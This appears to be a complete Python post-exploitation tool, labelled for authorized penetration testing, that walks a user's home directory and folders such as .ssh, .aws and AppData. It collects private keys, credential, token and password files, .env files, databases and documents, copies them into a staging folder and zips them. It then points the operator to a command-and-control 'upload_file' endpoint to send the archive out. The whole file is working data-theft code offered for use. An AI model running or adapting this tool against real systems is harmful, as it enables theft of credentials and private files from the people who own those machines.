#!/usr/bin/env python3
"""
File Exfiltration - Post-Exploitation Module
Searches for and exfiltrates sensitive files from target system
For authorized penetration testing only
"""

import os
import sys
import shutil
import fnmatch
from pathlib import Path
import zipfile
from datetime import datetime

class FileExfiltrator:
    def __init__(self, output_dir='exfiltrated_data'):
        self.output_dir = output_dir
        self.files_found = []
        
        # Common sensitive file patterns
        self.sensitive_patterns = [
            '*.txt', '*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx',
            '*.ppt', '*.pptx', '*.key', '*.pem', '*.p12', '*.pfx',
            '*password*', '*credentials*', '*secret*', '*token*',
            '*config*', '*.xml', '*.json', '*.yaml', '*.yml',
            '*.sql', '*.db', '*.sqlite', '*.mdb', '*.accdb',
            '*backup*', '*.bak', '*.old', '*.log', '*.env',
            '*id_rsa*', '*id_dsa*', '*.ppk', '*private*key*'
        ]
        
        # Common sensitive directories
        self.sensitive_dirs = [
            'Desktop', 'Documents', 'Downloads', 
            '.ssh', '.aws', '.config', '.docker',
            'AppData', 'credentials', 'keys', 'certs',
            'backup', 'backups'
        ]
        
        os.makedirs(self.output_dir, exist_ok=True)
    
    def search_directory(self, start_path, patterns=None, max_depth=5, max_size_mb=50):
        """
        Search directory for sensitive files
        
        Args:
            start_path: Starting directory
            patterns: List of file patterns to match
            max_depth: Maximum directory depth to search
            max_size_mb: Maximum file size in MB to collect
        """
        if patterns is None:
            patterns = self.sensitive_patterns
        
        print(f"[*] Searching: {start_path}")
        print(f"[*] Patterns: {len(patterns)} file patterns")
        print(f"[*] Max depth: {max_depth}")
        print(f"[*] Max file size: {max_size_mb}MB\n")
        
        max_size_bytes = max_size_mb * 1024 * 1024
        
        for root, dirs, files in os.walk(start_path):
            # Calculate current depth
            depth = root[len(start_path):].count(os.sep)
            if depth >= max_depth:
                dirs.clear()
                continue
            
            # Filter out common non-sensitive dirs
            dirs[:] = [d for d in dirs if not d.startswith('.') or d in self.sensitive_dirs]
            
            for filename in files:
                filepath = os.path.join(root, filename)
                
                try:
                    # Check file size
                    if os.path.getsize(filepath) > max_size_bytes:
                        continue
                    
                    # Check if filename matches any pattern
                    for pattern in patterns:
                        if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                            self.files_found.append(filepath)
                            print(f"  [+] Found: {filepath}")
                            break
                            
                except (PermissionError, OSError):
                    continue
        
        print(f"\n[+] Search complete. Found {len(self.files_found)} files")
        return self.files_found
    
    def search_user_directories(self):
        """Search common user directories for sensitive files"""
        home_dir = Path.home()
        
        print(f"[*] Searching user directories in: {home_dir}\n")
        
        search_paths = []
        for sensitive_dir in self.sensitive_dirs:
            search_path = home_dir / sensitive_dir
            if search_path.exists():
                search_paths.append(str(search_path))
        
        all_files = []
        for path in search_paths:
            files = self.search_directory(path, max_depth=3)
            all_files.extend(files)
        
        return all_files
    
    def copy_files(self, files=None, preserve_structure=True):
        """
        Copy found files to exfiltration directory
        
        Args:
            files: List of files to copy (uses self.files_found if None)
            preserve_structure: Preserve original directory structure
        """
        if files is None:
            files = self.files_found
        
        if not files:
            print("[!] No files to copy")
            return
        
        print(f"\n[*] Copying {len(files)} files to: {self.output_dir}")
        
        copied_count = 0
        for filepath in files:
            try:
                if preserve_structure:
                    # Preserve directory structure
                    rel_path = os.path.relpath(filepath, '/')
                    dest_path = os.path.join(self.output_dir, rel_path)
                else:
                    # Flatten structure
                    filename = os.path.basename(filepath)
                    dest_path = os.path.join(self.output_dir, filename)
                
                # Create destination directory
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                
                # Copy file
                shutil.copy2(filepath, dest_path)
                copied_count += 1
                print(f"  [+] Copied: {filepath}")
                
            except Exception as e:
                print(f"  [!] Error copying {filepath}: {e}")
        
        print(f"\n[+] Successfully copied {copied_count}/{len(files)} files")
    
    def create_archive(self, archive_name=None):
        """Create a ZIP archive of exfiltrated files"""
        if archive_name is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            archive_name = f"exfiltrated_{timestamp}.zip"
        
        archive_path = archive_name
        
        print(f"\n[*] Creating archive: {archive_path}")
        
        try:
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.output_dir):
                    for file in files:
                        filepath = os.path.join(root, file)
                        arcname = os.path.relpath(filepath, self.output_dir)
                        zipf.write(filepath, arcname)
            
            # Get archive size
            archive_size = os.path.getsize(archive_path)
            size_mb = archive_size / (1024 * 1024)
            
            print(f"[+] Archive created: {archive_path}")
            print(f"[+] Archive size: {size_mb:.2f} MB")
            print(f"\n[*] Ready for exfiltration via C&C upload_file endpoint")
            
            return archive_path
            
        except Exception as e:
            print(f"[!] Error creating archive: {e}")
            return None
    
    def search_by_content(self, search_terms, file_extensions=None):
        """Search files by content"""
        if file_extensions is None:
            file_extensions = ['.txt', '.log', '.conf', '.config', '.xml', '.json', '.yml', '.yaml', '.env']
        
        print(f"[*] Searching files by content...")
        print(f"[*] Search terms: {search_terms}")
        print(f"[*] File extensions: {file_extensions}\n")
        
        matches = []
        
        for root, dirs, files in os.walk(Path.home()):
            for filename in files:
                if any(filename.endswith(ext) for ext in file_extensions):
                    filepath = os.path.join(root, filename)
                    
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            for term in search_terms:
                                if term.lower() in content.lower():
                                    matches.append(filepath)
                                    print(f"  [+] Match found in: {filepath}")
                                    break
                    except:
                        continue
        
        print(f"\n[+] Found {len(matches)} files containing search terms")
        return matches

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='File exfiltration for authorized pentesting')
    parser.add_argument('--search-path', help='Path to search (default: user home)')
    parser.add_argument('--output', default='exfiltrated_data', help='Output directory')
    parser.add_argument('--archive', action='store_true', help='Create ZIP archive')
    parser.add_argument('--patterns', help='Comma-separated file patterns (e.g., *.pdf,*.doc)')
    parser.add_argument('--max-size', type=int, default=50, help='Max file size in MB')
    parser.add_argument('--search-content', help='Search for files containing these terms (comma-separated)')
    args = parser.parse_args()
    
    print("="*60)
    print("File Exfiltration Tool - Red Team")
    print("For Authorized Penetration Testing Only")
    print("="*60 + "\n")
    
    exfiltrator = FileExfiltrator(output_dir=args.output)
    
    # Content search mode
    if args.search_content:
        terms = [t.strip() for t in args.search_content.split(',')]
        files = exfiltrator.search_by_content(terms)
        exfiltrator.files_found = files
    
    # Pattern search mode
    else:
        # Parse custom patterns if provided
        if args.patterns:
            patterns = [p.strip() for p in args.patterns.split(',')]
        else:
            patterns = None
        
        # Search
        if args.search_path:
            exfiltrator.search_directory(args.search_path, patterns, max_size_mb=args.max_size)
        else:
            exfiltrator.search_user_directories()
    
    # Copy files
    if exfiltrator.files_found:
        exfiltrator.copy_files()
        
        # Create archive if requested
        if args.archive:
            archive_path = exfiltrator.create_archive()
            if archive_path:
                print(f"\n[*] Use C&C upload_file to exfiltrate: {archive_path}")
    else:
        print("[!] No files found to exfiltrate")

if __name__ == '__main__':
    main()
